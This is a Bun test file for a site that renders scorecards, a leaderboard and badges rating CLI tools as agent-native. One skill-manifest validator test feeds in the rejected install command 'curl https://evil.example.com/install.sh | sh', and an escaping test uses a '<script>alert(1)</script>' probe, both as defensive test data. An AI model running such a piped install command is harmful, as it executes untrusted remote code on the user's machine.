import { describe, expect, test } from 'bun:test';
import { mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { badgeColor, badgeFormat, renderBadgeSvg } from '../src/build/badge.mjs';
import { renderMarkdown } from '../src/build/render.mjs';
import {
  computeLayerScore,
  computeLeaderboard,
  computePrincipleScore,
  computeScore,
  extractTopIssues,
  loadRegistry,
  loadScorecards,
} from '../src/build/scorecards.mjs';
import { buildLeaderboardBody, buildScorecardBody, renderAudienceBanner } from '../src/build/scorecards-render.mjs';
import { loadSkillData } from '../src/build/skill.mjs';
import { BADGE_FLOOR, escHtml, parseFilename, SPEC_VERSION, sortedGlob } from '../src/build/util.mjs';

describe('sortedGlob', () => {
  test('sorts principles by numeric prefix, not lexicographic', async () => {
    const dir = join(tmpdir(), `sortedGlob-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    try {
      for (const name of ['p10-tenth.md', 'p2-second.md', 'p1-first.md', 'p9-ninth.md', 'notes.md', 'p3-third.md']) {
        await writeFile(join(dir, name), '# stub\n');
      }
      const result = await sortedGlob(dir);
      const names = result.map((p) => p.slice(p.lastIndexOf('/') + 1));
      expect(names).toEqual(['p1-first.md', 'p2-second.md', 'p3-third.md', 'p9-ninth.md', 'p10-tenth.md']);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('parseFilename', () => {
  test('extracts n and slug from bare filename', () => {
    expect(parseFilename('p3-progressive-help-discovery.md')).toEqual({
      n: 3,
      slug: 'progressive-help-discovery',
    });
  });

  test('extracts n and slug from absolute path', () => {
    expect(parseFilename('/some/abs/path/p7-bounded-high-signal-responses.md')).toEqual({
      n: 7,
      slug: 'bounded-high-signal-responses',
    });
  });

  test('throws on non-principle filename', () => {
    expect(() => parseFilename('notes.md')).toThrow();
  });

  test('throws on uppercase prefix', () => {
    expect(() => parseFilename('P1-foo.md')).toThrow();
  });
});

// RFC-keyword regex + plugin cases from docs/DESIGN.md §4.7 (A6/C2).
describe('rfc-keywords plugin', () => {
  async function render(md: string): Promise<string> {
    return renderMarkdown(md);
  }

  test('MUST becomes a single rfc-must strong', async () => {
    const html = await render('The agent MUST run.');
    expect(html).toContain('<strong class="rfc-must">MUST</strong>');
  });

  test('MUST NOT becomes a single rfc-must strong, not two', async () => {
    const html = await render('The agent MUST NOT prompt.');
    expect(html).toContain('<strong class="rfc-must">MUST NOT</strong>');
    expect(html).not.toContain('<strong class="rfc-must">MUST</strong> NOT');
    // Exactly one rfc-must span in this single-keyword sentence.
    const count = (html.match(/class="rfc-must"/g) ?? []).length;
    expect(count).toBe(1);
  });

  test('SHOULD NOT becomes a single rfc-should strong', async () => {
    const html = await render('The tool SHOULD NOT block on prompts.');
    expect(html).toContain('<strong class="rfc-should">SHOULD NOT</strong>');
  });

  test('MAY becomes rfc-may', async () => {
    const html = await render('Callers MAY pass --verbose.');
    expect(html).toContain('<strong class="rfc-may">MAY</strong>');
  });

  test('MUSTARD does not match (word boundary strict)', async () => {
    const html = await render('I like MUSTARD on my burger.');
    expect(html).not.toContain('class="rfc-must"');
    expect(html).toContain('MUSTARD');
  });

  test('lowercase must does not match', async () => {
    const html = await render('The agent must run.');
    expect(html).not.toContain('class="rfc-must"');
  });

  test('MUST inside inlineCode does not match', async () => {
    const html = await render('Use the `MUST` convention.');
    expect(html).not.toContain('class="rfc-must"');
    expect(html).toContain('MUST');
  });

  test('MUST inside fenced code block does not match', async () => {
    const html = await render('```\nMUST run\n```\n');
    expect(html).not.toContain('class="rfc-must"');
  });

  test('MUST inside link label does not match', async () => {
    const html = await render('[MUST see this](https://example.com)');
    expect(html).not.toContain('class="rfc-must"');
  });

  test('trailing comma after MUST still matches', async () => {
    const html = await render('The agent MUST, at minimum, support JSON.');
    expect(html).toContain('<strong class="rfc-must">MUST</strong>');
  });

  test('**MUST:** nested-strong annotates parent, no double strong', async () => {
    // **MUST:** — mdast `strong` with a single text child whose value is
    // `MUST:` (keyword + colon). The plugin should annotate the existing
    // strong rather than nesting a second one.
    const html = await render('**MUST:** this holds always.');
    // Should have a single <strong class="rfc-must"> element containing MUST:,
    // never nested.
    expect(html).not.toContain('<strong class="rfc-must"><strong>');
    expect(html).not.toContain('<strong><strong class="rfc-must">');
    // The annotation should appear (either via the nested-strong branch or
    // the split-children branch — accept both).
    expect(html).toContain('class="rfc-must"');
  });

  test('MUST inside a heading matches', async () => {
    const html = await render('## MUST behave correctly\n\nBody.');
    expect(html).toContain('class="rfc-must"');
  });
});

// -------------------------------------------------------------------
// escHtml
// -------------------------------------------------------------------

describe('escHtml', () => {
  test('escapes all HTML special characters', () => {
    expect(escHtml('<b>"Tom & Jerry\'s"</b>')).toBe('&lt;b&gt;&quot;Tom &amp; Jerry&#39;s&quot;&lt;/b&gt;');
  });

  test('passes through safe strings unchanged', () => {
    expect(escHtml('hello world')).toBe('hello world');
  });

  test('coerces non-strings', () => {
    expect(escHtml(42)).toBe('42');
  });
});

// -------------------------------------------------------------------
// Scorecards module
// -------------------------------------------------------------------

// Reusable scorecard fixture matching the anc check --output json schema.
function makeScorecard(overrides: Partial<{ results: any[]; summary: any }> = {}) {
  const results = overrides.results ?? [
    {
      id: 'p1-non-interactive',
      label: 'Non-interactive by default',
      group: 'P1',
      layer: 'behavioral',
      status: 'pass',
      evidence: null,
    },
    {
      id: 'p2-json-output',
      label: 'Structured output support',
      group: 'P2',
      layer: 'behavioral',
      status: 'fail',
      evidence: 'no --output flag',
    },
    {
      id: 'p3-help',
      label: 'Help flag produces useful output',
      group: 'P3',
      layer: 'behavioral',
      status: 'pass',
      evidence: null,
    },
    { id: 'p3-version', label: 'Version flag works', group: 'P3', layer: 'behavioral', status: 'pass', evidence: null },
    {
      id: 'p4-bad-args',
      label: 'Rejects invalid arguments',
      group: 'P4',
      layer: 'behavioral',
      status: 'pass',
      evidence: null,
    },
    {
      id: 'p6-sigpipe',
      label: 'Handles SIGPIPE gracefully',
      group: 'P6',
      layer: 'behavioral',
      status: 'pass',
      evidence: null,
    },
    {
      id: 'p6-no-color',
      label: 'Respects NO_COLOR',
      group: 'P6',
      layer: 'behavioral',
      status: 'warn',
      evidence: 'flag not detected',
    },
    { id: 'p7-quiet', label: 'Quiet mode available', group: 'P7', layer: 'behavioral', status: 'pass', evidence: null },
  ];
  const summary = overrides.summary ?? {
    total: results.length,
    pass: results.filter((r: any) => r.status === 'pass').length,
    warn: results.filter((r: any) => r.status === 'warn').length,
    fail: results.filter((r: any) => r.status === 'fail').length,
    skip: results.filter((r: any) => r.status === 'skip').length,
    error: results.filter((r: any) => r.status === 'error').length,
  };
  return { results, summary };
}

describe('loadRegistry', () => {
  test('parses valid YAML with all required fields', async () => {
    const dir = join(tmpdir(), `registry-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    await writeFile(
      registryPath,
      `tools:
  - name: gh
    repo: cli/cli
    binary: gh
    language: Go
    tier: workhorse
    creator: GitHub
    description: GitHub CLI
  - name: rg
    repo: BurntSushi/ripgrep
    binary: rg
    language: Rust
    tier: notable
    creator: Andrew Gallant
    description: Fast grep
`,
    );
    try {
      const tools = await loadRegistry(registryPath);
      expect(tools).toHaveLength(2);
      expect(tools[0].name).toBe('gh');
      expect(tools[1].tier).toBe('notable');
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('throws on name with spaces or uppercase', async () => {
    const dir = join(tmpdir(), `registry-bad-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    await writeFile(
      registryPath,
      `tools:
  - name: Claude Code
    repo: anthropics/claude-code
    binary: claude
    language: TypeScript
    tier: agent
    creator: Anthropic
    description: AI coding tool
`,
    );
    try {
      await expect(loadRegistry(registryPath)).rejects.toThrow(/must match/);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('throws on duplicate names', async () => {
    const dir = join(tmpdir(), `registry-dup-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    await writeFile(
      registryPath,
      `tools:
  - name: gh
    repo: cli/cli
    binary: gh
    language: Go
    tier: workhorse
    creator: GitHub
    description: GitHub CLI
  - name: gh
    repo: cli/cli
    binary: gh
    language: Go
    tier: workhorse
    creator: GitHub
    description: Duplicate
`,
    );
    try {
      await expect(loadRegistry(registryPath)).rejects.toThrow(/duplicate/);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('accepts each known audit_profile value', async () => {
    const dir = join(tmpdir(), `registry-profile-ok-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    // Mirrors the four ExceptionCategory variants in CLI v0.1.3.
    await writeFile(
      registryPath,
      `tools:
  - name: tui-app
    repo: x/tui
    binary: tui
    language: Go
    tier: workhorse
    creator: x
    description: A tui
    audit_profile: human-tui
  - name: file-tool
    repo: x/file
    binary: ft
    language: Rust
    tier: workhorse
    creator: x
    description: A file tool
    audit_profile: file-traversal
  - name: posix-tool
    repo: x/posix
    binary: pt
    language: C
    tier: workhorse
    creator: x
    description: A posix tool
    audit_profile: posix-utility
  - name: diag-tool
    repo: x/diag
    binary: dt
    language: C
    tier: workhorse
    creator: x
    description: A diag tool
    audit_profile: diagnostic-only
`,
    );
    try {
      const tools = await loadRegistry(registryPath);
      expect(tools).toHaveLength(4);
      expect(tools.map((t: any) => t.audit_profile)).toEqual([
        'human-tui',
        'file-traversal',
        'posix-utility',
        'diagnostic-only',
      ]);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('rejects unknown audit_profile (typo guard)', async () => {
    const dir = join(tmpdir(), `registry-profile-bad-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    await writeFile(
      registryPath,
      `tools:
  - name: bad
    repo: x/y
    binary: x
    language: Rust
    tier: workhorse
    creator: x
    description: x
    audit_profile: tui-by-design
`,
    );
    try {
      await expect(loadRegistry(registryPath)).rejects.toThrow(/unknown audit_profile/);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('treats missing audit_profile as fine (most tools have none)', async () => {
    const dir = join(tmpdir(), `registry-profile-absent-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const registryPath = join(dir, 'registry.yaml');
    await writeFile(
      registryPath,
      `tools:
  - name: plain
    repo: x/y
    binary: x
    language: Go
    tier: workhorse
    creator: x
    description: x
`,
    );
    try {
      const tools = await loadRegistry(registryPath);
      expect(tools).toHaveLength(1);
      expect(tools[0].audit_profile).toBeUndefined();
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('loadScorecards', () => {
  test('reads JSON files and matches to registry entries', async () => {
    const dir = join(tmpdir(), `scorecards-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const sc = makeScorecard();
    await writeFile(join(dir, 'gh-v2.74.0.json'), JSON.stringify(sc));
    try {
      const registry = [
        {
          name: 'gh',
          repo: 'cli/cli',
          binary: 'gh',
          language: 'Go',
          tier: 'workhorse',
          creator: 'GitHub',
          description: 'GitHub CLI',
          version: '2.74.0',
        },
        {
          name: 'rg',
          repo: 'BurntSushi/ripgrep',
          binary: 'rg',
          language: 'Rust',
          tier: 'notable',
          creator: 'AG',
          description: 'grep',
        },
      ];
      const result = await loadScorecards(dir, registry);
      expect(result).toHaveLength(2);
      expect(result[0].scorecard).not.toBeNull();
      expect(result[1].scorecard).toBeNull(); // rg has no version → unscored
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('computeScore', () => {
  test('computes pass / (pass + warn + fail), excluding skip/error', () => {
    const sc = makeScorecard();
    const score = computeScore(sc);
    // 6 pass, 1 warn, 1 fail → 6/8 = 0.75
    expect(score).toBe(0.75);
  });

  test('returns 0 for null scorecard', () => {
    expect(computeScore(null)).toBe(0);
  });

  test('returns 0 when denominator is 0 (all skip)', () => {
    const sc = makeScorecard({
      results: [{ id: 'x', label: 'x', group: 'P1', layer: 'behavioral', status: 'skip', evidence: null }],
      summary: { total: 1, pass: 0, warn: 0, fail: 0, skip: 1, error: 0 },
    });
    expect(computeScore(sc)).toBe(0);
  });
});

describe('computePrincipleScore', () => {
  test('maps P1-P7 groups correctly, excludes CodeQuality/ProjectStructure', () => {
    const sc = makeScorecard();
    const ps = computePrincipleScore(sc);
    expect(ps.total).toBe(7);
    // P1=pass, P2=fail, P3=pass, P4=pass, P5=skip(no checks), P6=partial(has warn), P7=pass
    expect(ps.met).toBe(4); // P1, P3, P4, P7
    expect(ps.details.find((d: any) => d.group === 'P2')?.status).toBe('fail');
    expect(ps.details.find((d: any) => d.group === 'P6')?.status).toBe('partial');
  });

  test('returns 0/7 for null scorecard', () => {
    const ps = computePrincipleScore(null);
    expect(ps.met).toBe(0);
    expect(ps.total).toBe(7);
  });
});

describe('computeLayerScore', () => {
  test('separates behavioral+project from source checks', () => {
    const sc = makeScorecard();
    const ls = computeLayerScore(sc);
    expect(ls.primary).toBeGreaterThan(0);
    expect(ls.source).toBeNull(); // fixture has no source-layer checks
  });
});

describe('extractTopIssues', () => {
  test('returns FAIL checks before WARN checks, limited to N', () => {
    const sc = makeScorecard();
    const issues = extractTopIssues(sc, 3);
    expect(issues.length).toBeLessThanOrEqual(3);
    // First issue should be the fail (P2)
    expect(issues[0].status).toBe('fail');
    // Second should be the warn (P6)
    expect(issues[1].status).toBe('warn');
  });

  test('returns empty array for null scorecard', () => {
    expect(extractTopIssues(null)).toEqual([]);
  });
});

describe('computeLeaderboard', () => {
  test('sorts tools by descending pass rate, unscored at bottom', () => {
    const tools = [
      { tool: { name: 'unscored', tier: 'notable' }, scorecard: null },
      {
        tool: { name: 'low', tier: 'workhorse' },
        scorecard: makeScorecard({
          summary: { total: 4, pass: 1, warn: 1, fail: 2, skip: 0, error: 0 },
        }),
      },
      {
        tool: { name: 'high', tier: 'agent' },
        scorecard: makeScorecard({
          summary: { total: 4, pass: 4, warn: 0, fail: 0, skip: 0, error: 0 },
        }),
      },
    ];
    const lb = computeLeaderboard(tools as any);
    expect(lb[0].tool.name).toBe('high');
    expect(lb[0].rank).toBe(1);
    expect(lb[1].tool.name).toBe('low');
    expect(lb[2].tool.name).toBe('unscored');
    expect(lb[2].rank).toBe(3);
  });

  test('empty registry returns empty leaderboard', () => {
    expect(computeLeaderboard([])).toEqual([]);
  });
});

// -------------------------------------------------------------------
// renderAudienceBanner — H6 audience banner v2 (conditional + branched copy)
// -------------------------------------------------------------------

describe('renderAudienceBanner', () => {
  test('returns empty when no audience and no audit_profile (v1.0–v1.2 compat)', () => {
    expect(renderAudienceBanner(null, null)).toBe('');
    expect(renderAudienceBanner(undefined, undefined)).toBe('');
  });

  test('returns empty for agent-optimized with no audit_profile', () => {
    // Banner suppressed: the *absence* of a banner is the signal that the
    // tool reads as agent-native with no profile-level scoping.
    expect(renderAudienceBanner('agent-optimized', null)).toBe('');
  });

  test('renders headline + copy for human-primary', () => {
    const html = renderAudienceBanner('human-primary', null);
    expect(html).toContain('class="scorecard-audience-banner"');
    expect(html).toContain('<strong>human-primary</strong>');
    expect(html).toContain('optimized for human use');
    // Methodology link always present in the note line.
    expect(html).toContain('href="/methodology');
  });

  test('renders headline + copy for mixed', () => {
    const html = renderAudienceBanner('mixed', null);
    expect(html).toContain('<strong>mixed</strong>');
    expect(html).toContain('mixed signals');
  });

  test('renders profile pill + copy when audit_profile is set on agent-optimized', () => {
    // Banner appears even when audience is agent-optimized, as long as a
    // profile applied — the reader needs to know suppression was in effect.
    const html = renderAudienceBanner('agent-optimized', 'human-tui');
    expect(html).toContain('class="scorecard-audience-banner"');
    expect(html).toContain('class="audit-profile-pill"');
    expect(html).toContain('human-tui');
    expect(html).toContain('TUI');
    // No headline line in this case — agent-optimized doesn't get one.
    expect(html).not.toContain('<strong>agent-optimized</strong>');
  });

  test('renders both headline and profile copy when both are present', () => {
    const html = renderAudienceBanner('human-primary', 'human-tui');
    expect(html).toContain('<strong>human-primary</strong>');
    expect(html).toContain('class="audit-profile-pill"');
  });

  test('renders profile-specific copy for each known category', () => {
    expect(renderAudienceBanner(null, 'human-tui')).toContain('TUI');
    expect(renderAudienceBanner(null, 'file-traversal')).toContain('fd/find-style');
    expect(renderAudienceBanner(null, 'posix-utility')).toContain('POSIX');
    expect(renderAudienceBanner(null, 'diagnostic-only')).toContain('read-only');
  });

  test('falls through to safe default for unknown audience', () => {
    const html = renderAudienceBanner('unexpected_label', null);
    expect(html).toContain('classified as unexpected_label');
  });

  test('falls through to safe default for unknown audit_profile', () => {
    const html = renderAudienceBanner(null, 'novel-category');
    expect(html).toContain('audit profile');
    expect(html).toContain('novel-category');
  });

  test('escapes HTML in unknown audience values', () => {
    const html = renderAudienceBanner('<script>alert(1)</script>', null);
    expect(html).not.toContain('<script>alert(1)</script>');
    expect(html).toContain('&lt;script&gt;');
  });
});

// -------------------------------------------------------------------
// renderCheckRows (via buildScorecardBody) — suppressed-check rendering
// -------------------------------------------------------------------

describe('suppressed-check rendering', () => {
  // Minimal v1.3-shaped scorecard with one organic Skip and one
  // audit_profile-suppressed Skip in the same principle group.
  function suppressedScorecard() {
    return {
      schema_version: '0.3',
      audience: null,
      audit_profile: 'human-tui',
      results: [
        {
          id: 'p1-non-interactive',
          label: 'Non-interactive by default',
          group: 'P1',
          layer: 'behavioral',
          status: 'skip',
          evidence: 'suppressed by audit_profile: human-tui',
        },
        {
          id: 'p3-after-help',
          label: 'after_help section present',
          group: 'P3',
          layer: 'behavioral',
          status: 'skip',
          evidence: 'no flags exposed',
        },
        {
          id: 'p2-json-output',
          label: 'Structured output support',
          group: 'P2',
          layer: 'behavioral',
          status: 'pass',
          evidence: null,
        },
      ],
      summary: { total: 3, pass: 1, warn: 0, fail: 0, skip: 2, error: 0 },
    };
  }

  const tool = {
    name: 'lazygit',
    binary: 'lazygit',
    language: 'Go',
    tier: 'workhorse',
    creator: 'Jesse Duffield',
    description: 'TUI for git',
    repo: 'jesseduffield/lazygit',
  };

  test('audit_profile-suppressed Skip gets check--suppressed class and "N/A by <category>" status', () => {
    const sc = suppressedScorecard();
    const html = buildScorecardBody(tool, sc, [], { met: 0, total: 7, details: [] }, 1.0);
    expect(html).toContain('check--suppressed');
    expect(html).toContain('N/A by human-tui');
  });

  test('organic Skip retains check--skip without check--suppressed', () => {
    const sc = suppressedScorecard();
    const html = buildScorecardBody(tool, sc, [], { met: 0, total: 7, details: [] }, 1.0);
    // The organic skip row's status cell still shows "SKIP" uppercase.
    expect(html).toContain('>SKIP<');
    // And it must NOT carry the suppressed class.
    const organicSkipMatch = html.match(/<tr class="([^"]*)">\s*<td class="check__status">SKIP<\/td>/);
    expect(organicSkipMatch).not.toBeNull();
    expect(organicSkipMatch?.[1]).not.toContain('check--suppressed');
  });

  test('non-suppression Skip evidence is preserved verbatim', () => {
    const sc = suppressedScorecard();
    const html = buildScorecardBody(tool, sc, [], { met: 0, total: 7, details: [] }, 1.0);
    expect(html).toContain('no flags exposed');
  });

  test('only matches the exact CLI prefix "suppressed by audit_profile: " (with trailing space)', () => {
    // Pins the contract documented at SUPPRESSION_EVIDENCE_PREFIX in
    // agentnative/src/principles/registry.rs. A near-miss like
    // "suppressed by audit_profile_human-tui" must NOT be treated as
    // suppression — it's an organic Skip with prose evidence.
    const sc = {
      schema_version: '0.3',
      audience: null,
      audit_profile: null,
      results: [
        {
          id: 'p1-x',
          label: 'X',
          group: 'P1',
          layer: 'behavioral',
          status: 'skip',
          // Looks similar but isn't the contract — no colon-space.
          evidence: 'suppressed by audit_profile_human-tui',
        },
      ],
      summary: { total: 1, pass: 0, warn: 0, fail: 0, skip: 1, error: 0 },
    };
    const html = buildScorecardBody(tool, sc, [], { met: 0, total: 7, details: [] }, 1.0);
    expect(html).not.toContain('check--suppressed');
    expect(html).not.toContain('N/A by');
    // The status cell stays as the regular SKIP pill.
    expect(html).toContain('>SKIP<');
  });
});

// -------------------------------------------------------------------
// buildLeaderboardBody — H6 leaderboard data attrs + audience filter
// -------------------------------------------------------------------

describe('buildLeaderboardBody — audience filter wiring', () => {
  function entry(name: string, audience: string | null, auditProfile: string | null) {
    return {
      tool: {
        name,
        tier: 'workhorse',
        language: 'Rust',
        description: `${name} tool`,
      },
      scorecard:
        audience === null && auditProfile === null
          ? null
          : {
              audience,
              audit_profile: auditProfile,
              results: [],
              summary: { pass: 1, warn: 0, fail: 0 },
            },
      score: 1,
      principleScore: { met: 7, total: 7, details: [] },
      rank: 1,
    };
  }

  test('emits data-audience and data-audit-profile attrs on each row', () => {
    const lb = [entry('rg', 'agent-optimized', null), entry('lazygit', null, 'human-tui')];
    const html = buildLeaderboardBody(lb as any, '<p>m</p>');
    expect(html).toContain('data-audience="agent-optimized"');
    expect(html).toContain('data-audit-profile="human-tui"');
  });

  test('emits empty data-audience for unscored / pre-v1.3 rows', () => {
    const lb = [entry('newtool', null, null)];
    const html = buildLeaderboardBody(lb as any, '<p>m</p>');
    expect(html).toContain('data-audience=""');
    expect(html).toContain('data-audit-profile=""');
  });

  test('emits the agent-optimized-only toggle and methodology link', () => {
    const html = buildLeaderboardBody([entry('rg', 'agent-optimized', null)] as any, '<p>m</p>');
    expect(html).toContain('data-filter="agent-optimized-only"');
    expect(html).toContain('Agent-optimized only');
    // Methodology link in the hero lede.
    expect(html).toContain('href="/methodology"');
  });
});

// -------------------------------------------------------------------
// Regression guard — H6 Unit 0.5 audience kebab-case alignment
// -------------------------------------------------------------------
//
// `anc` v0.1.3 emits kebab-case audience values (`agent-optimized`,
// `human-primary`). Snake_case (`agent_optimized`, `human_primary`) was
// the pre-flip shape and must never reappear in the site repo — if it
// does, the leaderboard's "Agent-optimized only" toggle silently
// excludes every row and the audience banner falls through to its
// fallback copy. Both failures are silent (no exception), so this test
// is the only thing that catches the regression before users do.
//
// Mirrors the plan's verification step:
//   `rg 'agent_optimized|human_primary' src/ tests/ content/`
//
// Bun test (not biome rule) because the snake_case strings live in
// content/methodology.md as user-visible prose; biome's lint patterns
// are TS/JS-only.

import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join as joinPath } from 'node:path';

describe('audience kebab-case regression guard (H6 Unit 0.5)', () => {
  // The CLI v0.1.3 contract: audience values serialize as kebab-case.
  // See `agentnative/src/scorecard/audience.rs` and the H6 plan.
  const SNAKE_CASE_AUDIENCE_LITERALS = ['agent_optimized', 'human_primary'];

  const SCAN_ROOTS = ['src', 'tests', 'content'];
  // Self-reference exception: this test file MUST contain the snake_case
  // literals as test data — that's why we declare them as constants
  // above. Excluding by absolute path keeps the guard from regressing
  // on its own existence.
  const SELF_PATH = import.meta.path;

  function* walk(dir: string): Generator<string> {
    for (const entry of readdirSync(dir)) {
      const full = joinPath(dir, entry);
      if (statSync(full).isDirectory()) {
        yield* walk(full);
      } else if (/\.(ts|js|mjs|cjs|tsx|jsx|md)$/.test(entry)) {
        yield full;
      }
    }
  }

  test(`no snake_case audience literals in ${SCAN_ROOTS.join(', ')}/`, () => {
    const repoRoot = joinPath(import.meta.dir, '..');
    const offenders: Array<{ file: string; literal: string; line: number }> = [];

    for (const root of SCAN_ROOTS) {
      for (const file of walk(joinPath(repoRoot, root))) {
        if (file === SELF_PATH) continue;
        const text = readFileSync(file, 'utf8');
        const lines = text.split('\n');
        for (let i = 0; i < lines.length; i++) {
          for (const literal of SNAKE_CASE_AUDIENCE_LITERALS) {
            if (lines[i].includes(literal)) {
              offenders.push({
                file: file.slice(repoRoot.length + 1),
                literal,
                line: i + 1,
              });
            }
          }
        }
      }
    }

    if (offenders.length > 0) {
      const msg = offenders.map((o) => `  ${o.file}:${o.line} → "${o.literal}"`).join('\n');
      throw new Error(
        `Found snake_case audience literal(s) — anc v0.1.3 emits kebab-case ` +
          `(agent-optimized / human-primary). See H6 plan Unit 0.5.\n${msg}`,
      );
    }
  });
});

describe('loadSkillData — fail-fast validation', () => {
  function validManifest() {
    return {
      schema_version: 1,
      type: 'agent-skill',
      name: 'agent-native-cli',
      version: '0.1.0',
      description: 'desc',
      principles_url: 'https://anc.dev/p1',
      license: 'MIT',
      source: {
        type: 'git',
        url: 'https://github.com/brettdavies/agentnative-skill.git',
        commit: '47a76cceb8b7b1bc013c19ee18a5e38179b1dd0e',
      },
      install: {
        claude_code:
          'git clone --depth 1 https://github.com/brettdavies/agentnative-skill.git ~/.claude/skills/agent-native-cli',
      },
      verify: {
        command: 'git -C <install-dir> rev-parse HEAD',
        expected: '47a76cceb8b7b1bc013c19ee18a5e38179b1dd0e',
        semantics: 'advisory',
      },
      update: 'cd <install-dir> && git pull --ff-only',
      uninstall: 'rm -rf <install-dir>',
      skill_page_html: 'https://anc.dev/skill',
    };
  }

  async function writeAndLoad(manifest: unknown): Promise<unknown> {
    const dir = join(tmpdir(), `loadSkillData-${Date.now()}-${Math.random()}`);
    await mkdir(dir, { recursive: true });
    const path = join(dir, 'skill.json');
    await writeFile(path, JSON.stringify(manifest));
    try {
      return await loadSkillData(path);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  }

  test('happy path: valid manifest loads', async () => {
    const data = (await writeAndLoad(validManifest())) as { source: { commit: string } };
    expect(data.source.commit).toBe('47a76cceb8b7b1bc013c19ee18a5e38179b1dd0e');
  });

  test('missing top-level key fails with the key name', async () => {
    const m = validManifest() as Record<string, unknown>;
    delete m.license;
    await expect(writeAndLoad(m)).rejects.toThrow(/missing required key "license"/);
  });

  test('non-hex commit rejected', async () => {
    const m = validManifest();
    m.source.commit = 'NOT-A-SHA';
    await expect(writeAndLoad(m)).rejects.toThrow(/40-char lowercase hex SHA/);
  });

  test('uppercase-hex commit rejected (must be lowercase)', async () => {
    const m = validManifest();
    m.source.commit = '47A76CCEB8B7B1BC013C19EE18A5E38179B1DD0E';
    await expect(writeAndLoad(m)).rejects.toThrow(/40-char lowercase hex SHA/);
  });

  test('non-semver version rejected', async () => {
    const m = validManifest();
    m.version = '0.1';
    await expect(writeAndLoad(m)).rejects.toThrow(/must be semver/);
  });

  test('empty install map rejected (R5: at least one host)', async () => {
    const m = validManifest();
    m.install = {} as Record<string, string>;
    await expect(writeAndLoad(m)).rejects.toThrow(/at least one host/);
  });

  test('install command without git clone --depth 1 prefix rejected', async () => {
    const m = validManifest();
    m.install.claude_code = 'curl https://evil.example.com/install.sh | sh';
    await expect(writeAndLoad(m)).rejects.toThrow(/must start with "git clone --depth 1 "/);
  });

  test('bare-clone (no destination path) rejected — defends repo-name asymmetry', async () => {
    const m = validManifest();
    m.install.claude_code = 'git clone --depth 1 https://github.com/brettdavies/agentnative-skill.git';
    await expect(writeAndLoad(m)).rejects.toThrow(/explicit destination path/);
  });

  test('invalid JSON rejected', async () => {
    const dir = join(tmpdir(), `loadSkillData-bad-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const path = join(dir, 'skill.json');
    await writeFile(path, '{not valid');
    try {
      await expect(loadSkillData(path)).rejects.toThrow(/invalid JSON/);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

// -------------------------------------------------------------------
// badge-maker rendering — color thresholds, label format, SVG output
// -------------------------------------------------------------------

describe('badgeColor — threshold mapping', () => {
  test('100% → brightgreen', () => {
    expect(badgeColor(100)).toBe('brightgreen');
  });

  test('80% (floor) → brightgreen — brightline at the eligibility floor', () => {
    expect(badgeColor(80)).toBe('brightgreen');
  });

  test('79% → yellow — one point below floor flips color', () => {
    expect(badgeColor(79)).toBe('yellow');
  });

  test('60% → yellow — bottom of mid band', () => {
    expect(badgeColor(60)).toBe('yellow');
  });

  test('59% → red', () => {
    expect(badgeColor(59)).toBe('red');
  });

  test('0% → red', () => {
    expect(badgeColor(0)).toBe('red');
  });
});

describe('badgeFormat — label, message, color contract', () => {
  test('label cites major.minor of spec version (patch dropped)', () => {
    const f = badgeFormat(0.91, '0.3.0');
    expect(f.label).toBe('agent-native v0.3');
  });

  test('label drops a non-zero patch component too', () => {
    const f = badgeFormat(0.91, '1.4.7');
    expect(f.label).toBe('agent-native v1.4');
  });

  test('default specVersion equals exported SPEC_VERSION constant', () => {
    const f = badgeFormat(0.91);
    const expected = SPEC_VERSION.split('.').slice(0, 2).join('.');
    expect(f.label).toBe(`agent-native v${expected}`);
  });

  test('message rounds the 0–1 score to integer percent', () => {
    expect(badgeFormat(0.916).message).toBe('92%');
    expect(badgeFormat(0.9149).message).toBe('91%');
    expect(badgeFormat(1.0).message).toBe('100%');
    expect(badgeFormat(0).message).toBe('0%');
  });

  test('color follows badgeColor of the rounded percent — green at floor', () => {
    expect(badgeFormat(BADGE_FLOOR).color).toBe('brightgreen');
    expect(badgeFormat(0.79).color).toBe('yellow');
    expect(badgeFormat(0.59).color).toBe('red');
  });

  test('style is flat — visually identical to shields.io defaults', () => {
    expect(badgeFormat(0.91).style).toBe('flat');
  });
});

describe('renderBadgeSvg — SVG output', () => {
  test('emits SVG with declared label and message in title', () => {
    const svg = renderBadgeSvg(0.91, '0.3.0');
    expect(svg).toContain('<svg');
    expect(svg).toContain('agent-native v0.3');
    expect(svg).toContain('91%');
    expect(svg).toContain('</svg>');
  });

  test('100% badge uses brightgreen fill (#4c1)', () => {
    const svg = renderBadgeSvg(1.0, '0.3.0');
    expect(svg).toContain('#4c1');
  });

  test('below-floor badge does NOT use brightgreen — visual signal stays honest on regression', () => {
    const svg = renderBadgeSvg(0.5, '0.3.0');
    expect(svg).not.toContain('#4c1');
  });
});

// -------------------------------------------------------------------
// Scorecard embed snippet (surface #1 of the badge plan).
// Above-floor: copy-paste snippet + SVG preview. Below-floor: hint
// pointing at /badge and the top-issues section.
// -------------------------------------------------------------------

import { buildEmbedMarkdown } from '../src/build/scorecards-render.mjs';

describe('buildEmbedMarkdown — README embed shape', () => {
